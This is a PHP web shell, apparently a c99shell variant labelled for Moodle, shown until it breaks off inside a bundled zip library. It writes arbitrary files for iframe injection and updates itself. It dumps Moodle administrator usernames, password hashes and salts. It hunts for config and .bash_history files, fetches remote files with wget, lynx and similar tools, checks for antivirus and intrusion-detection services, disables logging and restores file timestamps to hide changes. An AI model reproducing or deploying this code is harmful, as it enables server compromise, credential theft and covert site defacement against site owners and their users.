<?php
//$sversion = {SVERSION};
// k1b0rg version
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
//@ignore_user_abort(TRUE);
@set_time_limit(0);
//@set_magic_quotes_runtime(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);


function checkIp($ip, $array) {
$ip = preg_replace('%([^0-9.*]+)%i', '', $ip);
if (!preg_match('%^([0-9.*]{9,15})$%i', $ip)) {
return false;
}
$bit1 = explode('.', $ip);
foreach ($array as $checkedIp) {
if (false === strpos($checkedIp, '*') && $ip == $checkedIp) {
return true;
}
$bit2 = explode('.', $checkedIp);
for ($i = 0; $i < 4; ++$i) {
if ($bit2[$i] == '*' || $bit2[$i] == $bit1[$i]) {
if ($i == 3) {
return true;
}continue;
} else {break;
}}}return false;
}




if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'setIframe') {
	if (!isset($_POST['file']) || empty($_POST['file'])) {
		exit('error: [not defined filepath]');
	}
	if (!isset($_POST['content']) || empty($_POST['content'])) {
		exit('error: [not defined content]');
	}
	$filePath = $_POST['file'];
	$content  = $_POST['content'];
	if (get_magic_quotes_gpc()) {
		$content = stripslashes($content);
	}
	$file = @fopen($filePath, 'w');
	if (!$file) {
		exit('error: ['.$filePath.' failed to open]');
	}
	fwrite($file, $content) or exit('error: ['.$filePath.' failed to write]');
	fclose($file);
	echo('[setiframeok]');
	exit;
}


if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'getContent') {
	if (!isset($_POST['file']) || empty($_POST['file'])) {
		exit('error: [not defined filepath]');
	}
	$filepath = $_POST['file'];
	$filepath = str_replace('\\', '/', $filepath);
	if (!file_exists($filepath)) {
		exit('error: [file not exists ('.$filepath.')]');
	}
	if (!is_writable($filepath)) {
		exit('error: [file not writable ('.$filepath.')]');
	}
	$content = file_get_contents($filepath);
	$content = base64_encode(gzdeflate($content));
	echo('content: ['.$content.']');
	exit;
}


if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'getSelfVersion') {
	exit('version: ['.$sversion.']');
}

function find_moodle($localPath) {
	if (substr($localPath, -1) != '/') {
		$localPath .= '/';
	}
	if (file_exists($localPath.'config.php') && file_exists($localPath.'theme') && file_exists($localPath.'userpix')) {
		return $localPath;
	}
	$dir = opendir($localPath);
	while (false !== ($file = readdir($dir))) {
		if ($file != '.' && $file != '..' && is_dir($localPath.$file.'/')) {
			if (false !== ($localPather = find_moodle($localPath.$file.'/'))) {
				return $localPather;
			}
		}
	}
	closedir($dir);
	return false;
}


if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'findMoodle') {
	if (isset($_SERVER['DOCUMENT_ROOT'])) {
		$localPath = $_SERVER['DOCUMENT_ROOT'];
		$localPath = str_replace('\\', '/', $localPath);
	} elseif (isset($_SERVER['PHP_SELF']) || isset($_SERVER['SCRIPT_NAME'])) {
		$scriptPath = isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
		$tempPath   = str_replace('\\', '/', __FILE__);
		$scriptPath = str_replace('\\', '/', $scriptPath);
		$localPath  = str_replace($scriptPath, '', $tempPath);
	} else {
		exit('error: [not found phpinfo settings for defined localPath]');
	}
	if (substr($localPath, -1) != '/') {
		$localPath .= '/';
	}
	$moodlePath = find_moodle($localPath);
	if ($moodlePath) {
		echo('MoodlePath: ['.$moodlePath.']');
	} else {
		exit('error: [MoodlePath not found]');
	}
	exit;
}

if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'selfUpdate') {
	if (!isset($_POST['content'])) {
		exit('error: [no content]');
	}
	$content = $_POST['content'];
	$file = @fopen(__FILE__, 'w');
	if (!$file) {
		exit('error: [no writable file ("'.__FILE__.'")]');
	}
	fwrite($file, $content);
	fclose($file);
	exit('update: [OK]');
}


if (isset($_REQUEST['action'])) {
     exit('error: [undefined action: ('.$_REQUEST['action'].')]');
}
if (isset($_REQUEST['test'])) {die('huyakhuyakeshehomyak');}
if (isset($_REQUEST['moodle'])) {

    $path     = (isset($_POST['path'])) ? $_POST['path'] : found_script();
    if (isset($_POST['path']) && !valid_script_path($path)) {
	die('error: [Moodle path not valid]');
    }
    $userdata = array();
    $count    = 0;
    if (false === $path) {
        die('error: [Moodle not found]');
    }
	$curfile = __FILE__;
	if (false !== ($pos = strpos($curfile, '('))) {
		$curfile = substr($curfile, 0, $pos);
	}
	if (substr($curfile, strrpos($curfile, '/') + 1) == 'config.php') {
		$curfile = __FILE__;
		if (false !== ($pos = strpos($curfile, '('))) {
			$curfile = substr($curfile, 0, $pos);
		}
		$content = file_get_contents($curfile);
		$content = substr($content, strrpos($content, chr(60).chr(63)));
		eval(chr(63).chr(62).$content);
	} else {
		require($path.'config.php');
	}

	require($path.'version.php');
	echo('version: ['.$release.']'."\r\n");
	echo('samovers: ['.$sversion.']'."\r\n");
	/*if (version_compare($version, '1.8', '>=')) {
        $versionType = 3;
    } elseif (version_compare($version, '1.6', '>=')) {
        $versionType = 2;
    } else {
        $versionType = 1;
    }
    echo('versionType: ['.$versionType.']'."\n");*/

	$users = get_admins();
	if (!isset($CFG->passwordsaltmain)) {
		$CFG->passwordsaltmain = '';
	}
	if ($users) {
		foreach ($users as $userrow) {
			$userdata[$count]['login'] = $userrow->username;
			$userdata[$count]['hash']  = $userrow->password;
			$userdata[$count]['salt']  = $CFG->passwordsaltmain;
			++$count;
		}
		echo('users: ['.base64_encode(serialize($userdata)).']'."\n");
	} else {
		exit('error: [users does exists]');
	}
    exit;
}
$ac_count = 0;
$allow_ext		= array('mysql','mysqli','ftp','curl','imap','sockets','mssql','sqlite');
$allow_program	= array('gcc','cc','ld','php','perl','python','ruby','make','tar','nc','locate','suidperl','wget','get','fetch','links','lynx','curl','lwp-mirror','lwp-download');
$allow_service	= array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','tripwire','sxid','logcheck','logwatch');
@ob_start();
@ob_implicit_flush(0);
function onphpshutdown()
{
 global $gzipencode,$ft;
  $v = @ob_get_contents();
  @ob_end_clean();
  @ob_start("ob_gzHandler");
  echo $v;
  @ob_end_flush();
}

function which($which) {
	$locate = myshellexec('which '.$which);
	if($locate) { 
		return $locate;
	} else { 
		return false;
	}
}
function random($numofletters = 5) {
	$return = '';
	$symbol = array('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'r', 's', 't', 'u', 'y', 'w', 'z'); 
	for ($i = 1; $i < $numofletters; ++$i) { 
		$rand = rand(0, count($symbol)-1); 
		$return = $return.$symbol[$rand]; 
	}
	return $return;
}
function save_file($file, $content) {
	global $win;
	if(!file_exists($file)) {
		return false;
	}
	clearstatcache();
	$filetime = filemtime($file);
	if(!is_writable($file)) {
		$fileperm = substr(decoct(fileperms($file)), -4, 4);
		@chmod($file, intval(0777,8));
		if(!is_writable($file)) {
			return false;
		}
	}
	$handle = @fopen($file, 'w');
	if($handle === FALSE) {
		return false;
	}
	fwrite($handle, $content);
	fclose($handle);
	@touch($file, $filetime, $filetime);
	if(isset($fileperm) && !empty($fileperm)) {
		@chmod($file, intval($fileperm,8));
	}
	clearstatcache();
	return true;
}
function c99shexit() {
	onphpshutdown();
	exit;
}
function RecursFile($dir) {
	$files = array();
	if(substr($dir, -1) != DIRECTORY_SEPARATOR) {
		$dir .= DIRECTORY_SEPARATOR;
	}
	if(!file_exists($dir)) {
		return false;
	}
	clearstatcache(); // ??? ?
	$realpath = getcwd(); // ?????????????
	$handle = @opendir($dir);
	if(FALSE === $handle) {
		return false;
	}
	chdir($dir);
	while(FALSE !== ($file = readdir($handle))) {
		if('.' != $file && '..' != $file ) {
			if(is_dir($file)) {
				$recurs = RecursFile($dir.DIRECTORY_SEPARATOR.$file.DIRECTORY_SEPARATOR);
				if(is_array($recurs)) {
					$files = array_merge($files, $recurs);
				}
			} elseif(is_file($file)) {
				$files[] = str_replace(array('\\\\', '//'), DIRECTORY_SEPARATOR, $dir.DIRECTORY_SEPARATOR.$file);
			}
		}
	}
	closedir($handle);
	chdir($realpath); // i????? ??
	clearstatcache(); // ??? ?
	//sort($files);
	return $files;
}

/**
* ?????????????????????
*
*/
function RecursDir($dir) {
	$dirs = array();

	if(substr($dir, -1) != DIRECTORY_SEPARATOR) {
		$dir .= DIRECTORY_SEPARATOR;
	}
	if(!file_exists($dir)) {
		return false;
	}
	clearstatcache(); // ??? ?
	$realpath = getcwd(); // ?????????????
	$handle = @opendir($dir);
	if(FALSE === $handle) {
		return false;
	}
	chdir($dir);
	$dirs[] = str_replace(array('\\\\', '//'), DIRECTORY_SEPARATOR, $dir);
	while(FALSE !== ($file = readdir($handle))) {
		if('.' != $file && '..' != $file ) {
			if(is_dir($file)) {
				$dirs[] = str_replace(array('\\\\', '//'), DIRECTORY_SEPARATOR, $dir.DIRECTORY_SEPARATOR.$file.DIRECTORY_SEPARATOR);
				$recurs = RecursDir($dir.DIRECTORY_SEPARATOR.$file.DIRECTORY_SEPARATOR);
				if(is_array($recurs)) {
					$dirs = array_merge($dirs, $recurs);
				}
			}
		}
	}
	closedir($handle);
	chdir($realpath); // i????? ??
	clearstatcache(); // ??? ?
	$dirs = array_unique($dirs);
	return $dirs;
}

function setRecursPerm($dir, $perm) {
	$good = 0;
	$bad = 0;
	$all = array_merge(RecursFile($dir), RecursDir($dir));
	foreach($all as $file) {
		if(@chmod($file, $perm)) {
			$good++;
		} else {
			$bad++;
		}
	}
	return $good.':'.$bad;
}

$win = strtolower(substr(PHP_OS,0,3)) == "win";
if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=>$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
$_REQUEST = array_merge($_COOKIE,$_POST);
foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}
$shver = "5.0 MOODLE edition";
if (empty($surl)){
	$surl = $_SERVER['PHP_SELF'];
}
$surl = htmlspecialchars($surl);

$curdir = "./";
$tmpdir = "";
$tmpdir_log = "./";

$sort_default = "0a";
$sort_save = TRUE;

$upload_functions = array('fsockopen_upload', 'php_curl_upload', 'lwp_download_upload', 'get_upload', 'lynx_upload', 'elinks_upload', 'links_upload', 'system_curl_upload', 'fetch_upload', 'wget_upload');


$safemode_diskettes = array('a');
$hexdump_lines = 8;
$hexdump_rows = 24;
$nixpwdperpage = 100;

if (!$win) {
 $cmdaliases = array(
  array("-----------------------------------------------------------", "ls -la"),
  array("find config.inc.php files", "find / -type f -name config.inc.php"),
  array("find config* files", "find / -type f -name \"config*\""),
  array("find config* files in current dir", "find . -type f -name \"config*\""),
  array("find all writable folders and files", "find / -perm -2 -ls"),
  array("find all writable folders and files in current dir", "find . -perm -2 -ls"),
  array("find all .bash_history files", "find / -type f -name .bash_history"),
  array("find .bash_history files in current dir", "find . -type f -name .bash_history"),
  array("show opened ports", "netstat -an | grep -i listen")
 );
} else {
 $cmdaliases = array(
  array("-----------------------------------------------------------", "dir"),
  array("show opened ports", "netstat -an")
 );
}

$quicklaunch = array(
 array("<b><hr>Search</b>","#\" onclick=\"document.todo.act.value='search';document.todo.d.value='%d';document.todo.submit();"),
 array("<b>PHP-code</b>","#\" onclick=\"document.todo.act.value='eval';document.todo.d.value='%d';document.todo.submit();"),
 array("<b>Self remove</b>","#\" onclick=\"document.todo.act.value='selfremove';document.todo.submit();"),
);

$highlight_background = "#c0c0c0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";

$arcs = array('zip', 'tgz', 'tar.gz', 'tar.gzip','tar.bz2', 'tbz2', 'tb2', 'tbz','tar');
$last_arc = '';
@$f = $_REQUEST["f"];
@extract($_REQUEST["c99shcook"]);

if (isset($_POST['act'])) $act  = $_POST['act'];
if (isset($_POST['d'])) $d    = urldecode($_POST['d']); else $d=getcwd();
if (isset($_POST['sort'])) $sort = $_POST['sort'];
if (isset($_POST['f'])) $f    = urldecode($_POST['f']);
if (isset($_POST['ft'])) $ft   = $_POST['ft'];
if (isset($_POST['grep'])) $grep = $_POST['grep'];
if (isset($_POST['processes_sort'])) $processes_sort = $_POST['processes_sort'];
if (isset($_POST['pid'])) $pid  = $_POST['pid'];
if (isset($_POST['sig'])) $sig  = $_POST['sig'];
if (isset($_POST['base64'])) $base64  = $_POST['base64'];
if (isset($_POST['fullhexdump'])) $fullhexdump  = $_POST['fullhexdump'];
if (isset($_POST['c'])) $c  = $_POST['c'];
if (isset($_POST['white'])) $white  = $_POST['white'];
if (isset($_POST['nixpasswd'])) $nixpasswd  = $_POST['nixpasswd'];

$lastdir = @realpath(".");
@chdir($curdir);


$disablefunc = @ini_get("disable_functions");
if (!empty($disablefunc))
{
 $disablefunc = str_replace(" ","",$disablefunc);
 $disablefunc = explode(",",$disablefunc);
} else {
	$disablefunc = array();
}


function is_archive($filename) {
	global $arcs; 
	foreach ($arcs as $ext) {
		if (substr($filename, -strlen($ext)) == $ext) {
			return $ext;
		}
	}
	return false;
}


function str2mini($content,$len)
{
 if (strlen($content) > $len)
 {
  $len = ceil($len/2) - 2;
  return substr($content, 0,$len)."...".substr($content,-$len);
 }
 else {return $content;}
}

function lwp_download_upload($url, $filepath) {
	$test = myshellexec('echo \'huak\'');
	if (false === strpos($test, 'huak')) {
		return 'no exec';
	}
	$upload = myshellexec('lwp-download '.$url.' '.$filepath);
	if (file_exists($filepath) && filesize($filepath) != 0) {
		return true;
	} else {
		return 'not upload';
	}
}

function get_upload($url, $filepath) {
	$test = myshellexec('echo \'huak\'');
	if (false === strpos($test, 'huak')) {
		return 'no exec';
	}
	$locate = myshellexec('which GET');
	if (!$locate) {
		return 'not find GET';
	}
	$upload = myshellexec($locate.' '.$url.' > '.$filepath);
	if (file_exists($filepath) && filesize($filepath) != 0) {
		return true;
	} else {
		return 'not upload';
	}
}



function lynx_upload($url, $filepath) {
	$test = myshellexec('echo \'huak\'');
	if (false === strpos($test, 'huak')) {
		return 'no exec';
	}
	$locate = myshellexec('which lynx');
	if (!$locate) {
		return 'not find lynx';
	}
	$upload = myshellexec($locate.' -source '.$url.' > '.$filepath);
	if (file_exists($filepath) && filesize($filepath) != 0) {
		return true;
	} else {
		return 'not upload';
	}
}

function elinks_upload($url, $filepath) {
	$test = myshellexec('echo \'huak\'');
	if (false === strpos($test, 'huak')) {
		return 'no exec';
	}
	$locate = myshellexec('which elinks');
	if (!$locate) {
		return 'not find elinks';
	}
	$upload = myshellexec($locate.' -source '.$url.' > '.$filepath);
	if (file_exists($filepath) && filesize($filepath) != 0) {
		return true;
	} else {
		return 'not upload';
	}
}



function links_upload($url, $filepath) {
	$test = myshellexec('echo \'huak\'');
	if (false === strpos($test, 'huak')) {
		return 'no exec';
	}
	$locate = myshellexec('which links');
	if (!$locate) {
		return 'not find links';
	}
	$upload = myshellexec($locate.' -source '.$url.' > '.$filepath);
	if (file_exists($filepath) && filesize($filepath) != 0) {
		return true;
	} else {
		return 'not upload';
	}
}

define('ARCHIVE_TAR_ATT_SEPARATOR',90001 );define('ARCHIVE_TAR_END_BLOCK',pack("a512",''));class Tar{var $_tarname='';var $_compress=false;var $_compress_type='none';var $_separator=' ';var $_file=0 ;var $_temp_tarname='';function Tar($p_tarname,$p_compress=false){if(!$p_compress || $p_compress=='tar'){$this->_compress=false;$this->_compress_type='none';}else if($p_compress && in_array($p_compress,array('tgz','tar.gz','tar.gzip'))){$this->_compress=true;$this->_compress_type='gz';}else if($p_compress && in_array($p_compress,array('tbz','tb2','tbz2','tar.bzip2','tar.bz2'))){$this->_compress=true;$this->_compress_type='bz2';}else {$this->_error('unknown type: ['.$p_compress.']'."\n");return false;}$this->_tarname=$p_tarname;if($this->_compress){if($this->_compress_type=='gz')$extname='zlib';else if($this->_compress_type=='bz2')$extname='bz2';if(!extension_loaded($extname)){$this->_error('The extension '.$extname.' couldn\'t be found'."\n");return false;}}}function extract($p_path,$p_remove_path=''){$v_result=true;$v_list_detail=array();if($v_result=$this->_openRead()){$v_result=$this->_extractList($p_path,$v_list_detail,"complete",0 ,$p_remove_path);$this->_close();}return $v_result;}function _error($p_message){$this->raiseError=$p_message;}function getError(){return $this->raiseError;}function _warning($p_message){$this->raiseError=$p_message;}function _isArchive($p_filename=NULL){if($p_filename==NULL){$p_filename=$this->_tarname;}clearstatcache();return @is_file($p_filename) && !@is_link($p_filename);}function _openRead(){if(strtolower(substr($this->_tarname,0 ,7 ))=='http://'){if($this->_temp_tarname==''){$this->_temp_tarname=uniqid('tar').'.tmp';if(!$v_file_from=@fopen($this->_tarname,'rb')){$this->_error('Unable to open in read mode \''.$this->_tarname.'\'');$this->_temp_tarname='';return false;}if(!$v_file_to=@fopen($this->_temp_tarname,'wb')){$this->_error('Unable to open in write mode \''.$this->_temp_tarname.'\'');$this->_temp_tarname='';return false;}while($v_data=@fread($v_file_from,1024 ))@fwrite($v_file_to,$v_data);@fclose($v_file_from);@fclose($v_file_to);}$v_filename=$this->_temp_tarname;}else $v_filename=$this->_tarname;if($this->_compress_type=='gz')$this->_file=@gzopen($v_filename,"rb");else if($this->_compress_type=='bz2')$this->_file=@bzopen($v_filename,"r");else if($this->_compress_type=='none')$this->_file=@fopen($v_filename,"rb");else $this->_error('Unknown or missing compression type ('.$this->_compress_type.')');if($this->_file==0 ){$this->_error('Unable to open in read mode \''.$v_filename.'\'');return false;}return true;}function _close(){if(is_resource($this->_file)){if($this->_compress_type=='gz')@gzclose($this->_file);else if($this->_compress_type=='bz2')@bzclose($this->_file);else if($this->_compress_type=='none')@fclose($this->_file);else $this->_error('Unknown or missing compression type ('.$this->_compress_type.')');$this->_file=0 ;}if($this->_temp_tarname!=''){@unlink($this->_temp_tarname);$this->_temp_tarname='';}return true;}function _readBlock(){$v_block=null;if(is_resource($this->_file)){if($this->_compress_type=='gz')$v_block=@gzread($this->_file,512 );else if($this->_compress_type=='bz2')$v_block=@bzread($this->_file,512 );else if($this->_compress_type=='none')$v_block=@fread($this->_file,512 );else $this->_error('Unknown or missing compression type ('.$this->_compress_type.')');}return $v_block;}function _readHeader($v_binary_data,&$v_header){if(strlen($v_binary_data)==0 ){$v_header['filename']='';return true;}if(strlen($v_binary_data)!=512 ){$v_header['filename']='';$this->_error('Invalid block size : '.strlen($v_binary_data));return false;}if(!is_array($v_header)){$v_header=array();}$v_checksum=0 ;for($i=0 ;$i<148 ;$i++)$v_checksum+=ord(substr($v_binary_data,$i,1 ));for($i=148 ;$i<156 ;$i++)$v_checksum+=ord(' ');for($i=156 ;$i<512 ;$i++)$v_checksum+=ord(substr($v_binary_data,$i,1 ));$v_data=unpack("a100filename/a8mode/a8uid/a8gid/a12size/a12mtime/"."a8checksum/a1typeflag/a100link/a6magic/a2version/"."a32uname/a32gname/a8devmajor/a8devminor",$v_binary_data);$v_header['checksum']=OctDec(trim($v_data['checksum']));if($v_header['checksum']!=$v_checksum){$v_header['filename']='';if(($v_checksum==256 ) && ($v_header['checksum']==0 ))return true;$this->_error('Invalid checksum for file "'.$v_data['filename'].'" : '.$v_checksum.' calculated, '.$v_header['checksum'].' expected');return false;}$v_header['filename']=trim($v_data['filename']);if($this->_maliciousFilename($v_header['filename'])){$this->_error('Malicious .tar detected, file "'.$v_header['filename'].'" will not install in desired directory tree');return false;}$v_header['mode']=OctDec(trim($v_data['mode']));$v_header['uid']=OctDec(trim($v_data['uid']));$v_header['gid']=OctDec(trim($v_data['gid']));$v_header['size']=OctDec(trim($v_data['size']));$v_header['mtime']=OctDec(trim($v_data['mtime']));if(($v_header['typeflag']=$v_data['typeflag'])=="5"){$v_header['size']=0 ;}$v_header['link']=trim($v_data['link']);return true;}function _maliciousFilename($file){if(strpos($file,'/../')!==false){return true;}if(strpos($file,'../')===0 ){return true;}return false;}function _extractList($p_path,&$p_list_detail,$p_mode,$p_file_list,$p_remove_path){$v_result=true;$v_nb=0 ;$v_extract_all=true;$v_listing=false;$p_path=$this->_translateWinPath($p_path,false);if($p_path=='' || (substr($p_path,0 ,1 )!='/' && substr($p_path,0 ,3 )!="../" && !strpos($p_path,':'))){$p_path="./".$p_path;}$p_remove_path=$this->_translateWinPath($p_remove_path);if(($p_remove_path!='') && (substr($p_remove_path,-1 )!='/'))$p_remove_path.='/';$p_remove_path_size=strlen($p_remove_path);switch($p_mode){case "complete":$v_extract_all=TRUE;$v_listing=FALSE;break;case "partial":$v_extract_all=FALSE;$v_listing=FALSE;break;case "list":$v_extract_all=FALSE;$v_listing=TRUE;break;default:$this->_error('Invalid extract mode ('.$p_mode.')');return false;}clearstatcache();while(strlen($v_binary_data=$this->_readBlock())!=0 ){$v_extract_file=FALSE;$v_extraction_stopped=0 ;if(!$this->_readHeader($v_binary_data,$v_header))return false;if($v_header['filename']==''){continue;}if($v_header['typeflag']=='L'){if(!$this->_readLongHeader($v_header))return false;}if((!$v_extract_all) && (is_array($p_file_list))){$v_extract_file=false;for($i=0 ;$i<sizeof($p_file_list);$i++){if(substr($p_file_list[$i],-1 )=='/'){if((strlen($v_header['filename'])>strlen($p_file_list[$i])) && (substr($v_header['filename'],0 ,strlen($p_file_list[$i]))==$p_file_list[$i])){$v_extract_file=TRUE;break;}}elseif($p_file_list[$i]==$v_header['filename']){$v_extract_file=TRUE;break;}}}else {$v_extract_file=TRUE;}if(($v_extract_file) && (!$v_listing)){if(($p_remove_path!='') && (substr($v_header['filename'],0 ,$p_remove_path_size)==$p_remove_path))$v_header['filename']=substr($v_header['filename'],$p_remove_path_size);if(($p_path!='./') && ($p_path!='/')){while(substr($p_path,-1 )=='/')$p_path=substr($p_path,0 ,strlen($p_path)-1 );if(substr($v_header['filename'],0 ,1 )=='/')$v_header['filename']=$p_path.$v_header['filename'];else $v_header['filename']=$p_path.'/'.$v_header['filename'];}if(file_exists($v_header['filename'])){if((@is_dir($v_header['filename'])) && ($v_header['typeflag']=='')){$this->_error('File '.$v_header['filename'].' already exists as a directory');return false;}if(($this->_isArchive($v_header['filename'])) && ($v_header['typeflag']=="5")){$this->_error('Directory '.$v_header['filename'].' already exists as a file');return false;}if(!is_writeable($v_header['filename'])){$this->_error('File '.$v_header['filename'].' already exists and is write protected');return false;}if(filemtime($v_header['filename'])>$v_header['mtime']){}}elseif(($v_result=$this->_dirCheck(($v_header['typeflag']=="5"?$v_header['filename']:dirname($v_header['filename']))))!=1 ){$this->_error('Unable to create path for '.$v_header['filename']);return false;}if($v_extract_file){if($v_header['typeflag']=="5"){if(!@file_exists($v_header['filename'])){if(!@mkdir($v_header['filename'],0777 )){$this->_error('Unable to create directory {'.$v_header['filename'].'}');return false;}}}elseif($v_header['typeflag']=="2"){if(@file_exists($v_header['filename'])){@unlink($v_header['filename']);}if(!@symlink($v_header['link'],$v_header['filename'])){$this->_error('Unable to extract symbolic link {'.$v_header['filename'].'}');return false;}}else {if(($v_dest_file=@fopen($v_header['filename'],"wb"))==0 ){$this->_error('Error while opening {'.$v_header['filename'].'} in write binary mode');return false;}else {$n=floor($v_header['size']/512 );for($i=0 ;$i<$n;$i++){$v_content=$this->_readBlock();fwrite($v_dest_file,$v_content,512 );}if(($v_header['size']%512 )!=0 ){$v_content=$this->_readBlock();fwrite($v_dest_file,$v_content,($v_header['size']%512 ));}@fclose($v_dest_file);@touch($v_header['filename'],$v_header['mtime']);if($v_header['mode']&0111 ){$mode=fileperms($v_header['filename'])|(~umask()&0111 );@chmod($v_header['filename'],$mode);}}clearstatcache();if(filesize($v_header['filename'])!=$v_header['size']){$this->_error('Extracted file '.$v_header['filename'].' does not have the correct file size \''.filesize($v_header['filename']).'\' ('.$v_header['size'].' expected). Archive may be corrupted.');return false;}}}else {$this->_jumpBlock(ceil(($v_header['size']/512 )));}}else {$this->_jumpBlock(ceil(($v_header['size']/512 )));}if($v_listing || $v_extract_file || $v_extraction_stopped){if(($v_file_dir=dirname($v_header['filename']))==$v_header['filename'])$v_file_dir='';if((substr($v_header['filename'],0 ,1 )=='/') && ($v_file_dir==''))$v_file_dir='/';$p_list_detail[$v_nb++]=$v_header;if(is_array($p_file_list) && (count($p_list_detail)==count($p_file_list))){return true;}}}return true;}function _dirCheck($p_dir){clearstatcache();if((@is_dir($p_dir)) || ($p_dir==''))return true;$p_parent_dir=dirname($p_dir);if(($p_parent_dir!=$p_dir) && ($p_parent_dir!='') && (!$this->_dirCheck($p_parent_dir)))return false;if(!@mkdir($p_dir,0777 )){$this->_error("Unable to create directory '$p_dir'");return false;}return true;}function _pathReduction($p_dir){$v_result='';if($p_dir!=''){$v_list=explode('/',$p_dir);for($i=sizeof($v_list)-1 ;$i>=0 ;$i--){if($v_list[$i]=="."){}else if($v_list[$i]==".."){$i--;}else if(($v_list[$i]=='') && ($i!=(sizeof($v_list)-1 )) && ($i!=0 )){}else {$v_result=$v_list[$i].($i!=(sizeof($v_list)-1 )?'/'.$v_result:'');}}}$v_result=strtr($v_result,'\\','/');return $v_result;}function _translateWinPath($p_path,$p_remove_disk_letter=true){if(defined('OS_WINDOWS') && OS_WINDOWS){if(($p_remove_disk_letter) && (($v_position=strpos($p_path,':'))!=false)){$p_path=substr($p_path,$v_position+1 );}if((strpos($p_path,'\\')>0 ) || (substr($p_path,0 ,1 )=='\\')){$p_path=strtr($p_path,'\\','/');}}return $p_path;}}

define( 'PCLZIP_READ_BLOCK_SIZE', 2048 ); define( 'PCLZIP_SEPARATOR', ',' ); define( 'PCLZIP_ERROR_EXTERNAL', 0 ); define( 'PCLZIP_TEMPORARY_DIR', '' ); define('PCLZIP_OPT_REPLACE_NEWER', true);define( 'PCLZIP_ERR_USER_ABORTED', 2 ); define( 'PCLZIP_ERR_NO_ERROR', 0 ); define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 ); define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 ); define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 ); define( 'PCLZIP_ERR_MISSING_FILE', -4 ); define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 ); define( 'PCLZIP_ERR_INVALID_ZIP', -6 ); define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 ); define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );   define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );  define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 ); define( 'PCLZIP_ERR_BAD_EXTENSION', -9 ); define( 'PCLZIP_ERR_BAD_FORMAT', -10 ); define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 ); define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 ); define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 ); define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 ); define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 ); define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 ); define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 ); define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 ); define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 ); define( 'PCLZIP_OPT_PATH', 77001 ); define( 'PCLZIP_OPT_ADD_PATH', 77002 ); define( 'PCLZIP_OPT_REMOVE_PATH', 77003 ); define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 ); define( 'PCLZIP_OPT_SET_CHMOD', 77005 ); define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 ); define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 ); define( 'PCLZIP_CB_PRE_EXTRACT', 78001 ); define( 'PCLZIP_CB_POST_EXTRACT', 78002 ); class PclZip { var $zipname = ''; var $zip_fd = 0; var $error_code = 1; var $error_string = ''; var $magic_quotes_status; function PclZip($p_zipname) { if (!function_exists('gzopen')) { die('Abort '.basename(__FILE__).' : Missing zlib extensions'); } $this->zipname = $p_zipname; $this->zip_fd = 0; $this->magic_quotes_status = -1; return; } function extract($v_path = '') { $v_result=1; $this->privErrorReset(); if (!$this->privCheckFormat()) { return(0); } $v_options = array(); $v_remove_path = ""; 
$v_remove_all_path = false; $p_list = array(); $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options); unset($p_list); if ($v_result < 1) { return false; } return true; } function errorCode() { if (PCLZIP_ERROR_EXTERNAL == 1) { return(PclErrorCode()); } else { return($this->error_code); } } function errorName($p_with_code=false) { $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR', PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL', PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL', PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER', PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE', PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG', PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP', PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE', PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL', PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION', PCLZIP_ERR_BAD_FORMAT => 